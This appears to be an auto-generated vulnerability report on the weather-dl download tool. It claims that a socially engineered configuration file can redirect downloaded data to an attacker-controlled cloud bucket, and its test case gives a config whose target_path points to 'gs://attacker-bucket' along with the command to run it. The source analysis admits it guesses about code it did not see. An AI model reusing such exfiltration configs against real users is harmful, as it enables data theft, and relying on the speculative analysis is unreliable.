- vulnerability name: Malicious Configuration File Usage in `weather-dl`
- description: An attacker could attempt to socially engineer a user into using a malicious configuration file with the `weather-dl` tool. This malicious configuration file could be crafted to modify the destination where `weather-dl` saves the downloaded weather data. By changing the output path in the configuration file, an attacker can redirect the downloaded data to a destination they control, such as a cloud storage bucket owned by the attacker.
  To trigger this vulnerability:
    1. An attacker creates a malicious configuration file (e.g., `malicious_weather_config.cfg`) that is syntactically valid for `weather-dl`.
    2. In this malicious configuration file, the attacker modifies the `target_path` parameter within the `[parameters]` section to point to a cloud storage bucket or any other accessible storage location that is controlled by the attacker, instead of a legitimate or user-intended destination.
    3. The attacker uses social engineering techniques (e.g., phishing, posing as a trusted source, or exploiting user trust) to convince a legitimate user of `weather-tools` to use this `malicious_weather_config.cfg` file with the `weather-dl` command.
    4. The unsuspecting user, believing the file to be legitimate or not understanding the security implications, executes the `weather-dl` tool using the attacker-supplied configuration file: `weather-dl malicious_weather_config.cfg`.
    5. `weather-dl`, as designed, reads the configuration from `malicious_weather_config.cfg`, including the attacker-specified `target_path`.
    6. The tool proceeds to download the requested weather data from the configured source (e.g., ECMWF).
    7. Instead of saving the downloaded weather data to the user's intended secure location, `weather-dl`, as instructed by the malicious configuration, saves the data to the attacker-controlled destination specified in `target_path`.
    8. The attacker can then access the exfiltrated weather data from their controlled destination, completing the data exfiltration.
- impact: Data exfiltration. If successful, the attacker gains unauthorized access to potentially sensitive weather data downloaded by the user. This data can then be used for malicious purposes, depending on the attacker's objectives and the nature of the data. The impact is considered High as it directly leads to data loss and potential compromise of research or operational data.
- vulnerability rank: high
- currently implemented mitigations: The project's README mentions that "Downloads are driven from a configuration file, which can be reviewed (and version-controlled) independently of pipeline or analysis code." This serves as a weak form of mitigation, relying on the user to manually review and verify the configuration file's contents before use. This mitigation is documented in the main README file (`/code/README.md`) under the "Introduction" and "NOTE" sections in the "Steps" part of the Quickstart guide. However, it's not a technical mitigation implemented within the code itself, but rather a recommendation for users.
- missing mitigations:
    - Input validation: Implement robust validation checks within the `weather-dl` tool to verify the `target_path` in the configuration file. This validation should ensure that the destination path is within expected or user-approved locations and conforms to security policies.
    - User warnings: Enhance the `weather-dl` tool to display clear and prominent warnings to the user when a configuration file from an untrusted source is used. The warning should explicitly mention the risks of data exfiltration and recommend reviewing the configuration file, especially the output destination.
    - Destination restrictions: Implement options to restrict or pre-configure allowed destination paths or storage locations for downloaded data, preventing users (or attackers via malicious configs) from redirecting data to arbitrary external locations.
    - Signed configurations: Explore the possibility of using signed configuration files to ensure their authenticity and integrity, making it harder for attackers to distribute modified malicious versions.
- preconditions:
    - The attacker needs to create a malicious `weather-dl` configuration file.
    - The attacker must successfully socially engineer a user into using this malicious configuration file when running the `weather-dl` tool.
    - The user must have the necessary permissions and access to run `weather-dl` and download weather data.
- source code analysis: Based on the provided documentation, specifically the `README.md` and documentation files, the `weather-dl` tool uses configuration files ( `.cfg` or `.json`) to define download parameters, including the `target_path`. The tool, as described, processes this configuration file and uses the provided `target_path` to save downloaded data. There is no visible input validation or security checks on the `target_path` within the provided documentation or code snippets.

  ```
  File: /code/README.md

  ...
  Downloads are driven from a
  [configuration file](Configuration.md), which can be reviewed (and version-controlled) independently of pipeline or
  analysis code.
  ...
  **NOTE:** By default, local downloads are saved to the `./local_run` directory unless another file system is specified.
  The recommended output location for `weather-dl` is [Cloud Storage](https://cloud.google.com/storage).
  The source and destination of the download are configured using the `.cfg` configuration file which is passed to the command.
  ...
  ```

  The documentation highlights that the configuration file dictates the destination, and users are advised to review it. However, the code itself (which is not provided) likely parses the `target_path` from the configuration and uses it directly in file operations without further validation. This behavior allows an attacker to manipulate the destination by providing a crafted configuration file.

  [Diagram: Simplified data flow for weather-dl with malicious config]

  ```mermaid
  graph LR
      A[User executes weather-dl with malicious config] --> B{weather-dl tool};
      B --> C(Read malicious_config.cfg);
      C --> D{Extract target_path from config};
      D --> E[Download weather data];
      E --> F[Save data to target_path (attacker-controlled destination)];
      F --> G[Data exfiltration successful];
  ```

- security test case:
    1. Create a malicious configuration file named `malicious_config.cfg` with the following content. Replace `gs://attacker-bucket/exfiltrated_data` with a Google Cloud Storage bucket you control for testing purposes.
    ```cfg
    [parameters]
    client=cds
    dataset=reanalysis-era5-pressure-levels
    target_path=gs://attacker-bucket/exfiltrated_data/era5_data.nc
    partition_keys=year

    [selection]
    product_type=reanalysis
    format=netcdf
    variable=temperature
    pressure_level=850
    year=2023
    month=08
    day=01
    time=12:00
    ```
    2. Assume you are a user and have been socially engineered to use this configuration file. Execute the `weather-dl` tool using the malicious configuration:
    ```bash
    weather-dl malicious_config.cfg --local-run
    ```
    3. After the command execution completes, navigate to the attacker-controlled Google Cloud Storage bucket (`gs://attacker-bucket/exfiltrated_data/`) using the Google Cloud Console or `gsutil` command-line tool.
    4. Verify that the downloaded weather data file (`era5_data.nc`) is present in the `gs://attacker-bucket/exfiltrated_data/` bucket. This confirms that the data has been exfiltrated to the attacker-controlled destination, demonstrating the vulnerability.